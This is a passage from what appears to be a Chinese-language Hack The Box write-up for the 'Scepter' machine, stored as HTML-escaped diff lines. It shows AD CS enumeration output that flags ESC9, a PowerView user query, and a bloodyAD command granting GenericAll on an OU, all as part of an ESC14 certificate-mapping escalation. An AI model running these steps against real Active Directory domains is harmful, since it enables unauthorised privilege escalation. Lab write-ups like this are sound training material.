+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CA Name                             : scepter-DC01-CA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DNS Name                            : dc01.scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Subject                 : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter-DC01-CA, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity Start          : 2024-10-31 22:24:19+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity End            : 2061-10-31 22:34:19+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Web Enrollment
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTPS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    User Specified SAN                  : Disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Request Disposition                 : Issue
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enforce Encryption &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; Requests     : Enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Owner                             : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Access Rights
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ManageCa                        : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ManageCertificates              : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enroll                          : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;uthenticated Users
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Template Name                       : StaffAccessCertificate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Display Name                        : StaffAccessCertificate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Authorities             : scepter-DC01-CA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enabled                             : True
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Client Authentication               : True
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enrollment Agent                    : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Any Purpose                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enrollee Supplies Subject           : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Name Flag               : SubjectAltRequireEmail
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SubjectRequireDnsAsCn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SubjectRequireEmail
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enrollment Flag                     : AutoEnrollment
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          NoSecurityExtension
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Extended Key Usage                  : Client Authentication
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          Server Authentication
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Requires Manager Approval           : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Requires Key Archival               : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Authorized Signatures Required      : &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Schema Version                      : &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Validity Period                     : &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; years
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Renewal Period                      : &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; weeks
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Minimum RSA Key Length              : &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Template Created                    : 2024-11-01T02:29:00+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Template Last Modified              : 2024-11-01T09:00:54+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Enrollment Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enrollment Rights               : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;taff
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Object Control Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Owner                           : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Full Control Principals         : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal System
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Write Owner Principals          : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal System
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Write Dacl Principals           : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal System
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User Enrollable Principals      : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;taff
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Vulnerabilities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      ESC9                              : Template has no security extension.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Remarks
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      ESC9                              : Other prerequisites may be required &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this to be exploitable. See the wiki &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; more details.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现以d.baker的身份找到了ou同名证书，可以以esc9攻击，但是我尝试后发现并不可以&lt;/p&gt;
+&lt;p&gt;只能一点一点查看用户权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ powerview $domain/$user1:$pass1@$ip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/home/wackymaker/.local/share/pipx/venvs/powerview/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/__init__.py:20: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&amp;lt;81.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  import pkg_resources
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logging directory is set to /home/wackymaker/.powerview/logs/scepter-a.carter-10.129.103.0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;╭─LDAPS─&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dc01.scepter.htb&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;─&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;SCEPTER&lt;span style=&#34;color:#ae81ff&#34;&gt;\a&lt;/span&gt;.carter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;NS:10.129.103.0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;╰─PV ❯ Get-DomainUser -Identity h.brown -Properties *
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass                       : top
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    person
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    organizationalPerson
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    user
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cn                                : h.brown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;givenName                         : h.brown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName                 : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;h.brown,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;instanceType                      : &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whenCreated                       : 31/10/2024 22:40:01 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; months, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; day ago&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whenChanged                       : 07/03/2025 22:19:11 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; months, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; days ago&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;displayName                       : h.brown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uSNCreated                        : &lt;span style=&#34;color:#ae81ff&#34;&gt;16443&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;memberOf                          : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;CMS,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Helpdesk Admins,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Protected Users,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Remote Management Users,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Builtin,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uSNChanged                        : &lt;span style=&#34;color:#ae81ff&#34;&gt;106593&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name                              : h.brown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectGUID                        : &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;b4dc0e39-0e8a-4d7c-b0ab-b55ada0f817d&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;userAccountControl                : NORMAL_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    DONT_EXPIRE_PASSWORD
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;badPwdCount                       : &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;codePage                          : &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;countryCode                       : &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;badPasswordTime                   : 01/01/1601 00:00:00 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;424&lt;/span&gt; years, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; months ago&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lastLogoff                        : 1601-01-01 00:00:00+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lastLogon                         : 01/11/2024 03:33:05 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; months, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; day ago&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;logonHours                        : ////////////////////////////
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pwdLastSet                        : 07/03/2025 22:19:11 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; months, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; days ago&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;primaryGroupID                    : &lt;span style=&#34;color:#ae81ff&#34;&gt;513&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectSid                         : S-1-5-21-74879546-916818434-740295365-1108
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;accountExpires                    : 1601-01-01 00:00:00+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;logonCount                        : &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sAMAccountName                    : h.brown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sAMAccountType                    : SAM_USER_OBJECT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;userPrincipalName                 : h.brown@scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectCategory                    : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Person,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;altSecurityIdentities             : X509:&amp;lt;RFC822&amp;gt;h.brown@scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dSCorePropagationData             : 11/01/2024 04:07:16 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    01/01/1601 00:00:01 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lastLogonTimestamp                : 01/11/2024 00:19:13 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; months, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; day ago&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vulnerabilities                   : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;VULN-002&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User account with password that never expires &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;LOW&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;直到我找到了h.brown的这个属性altSecurityIdentities : X509:&lt;!-- raw HTML omitted --&gt;&lt;a class=&#34;link&#34; href=&#34;mailto:h.brown@scepter.htb&#34; &gt;h.brown@scepter.htb&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ESC14&lt;/a&gt;这篇文章描述了esc14的状况，类比我们现在的例子也就是当存在证书以h.brown@scepter.htb邮箱请求h.brown认证的时候，无论这个证书的dn归属，都能认证成功&lt;/p&gt;
+&lt;p&gt;首先通过组的全局掌控权限将a用户本身也具备对ou的全掌握权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodyAD --host $ip -d scepter.htb -u $user1 -p $pass1 add genericAll &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&amp;#34;&lt;/span&gt; a.carter
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; a.carter has now GenericAll on OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;STAFF ACCESS CERTIFICATE,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SCEPTER,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;HTB
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用这权限修改其中d.baker的邮箱&lt;/p&gt;
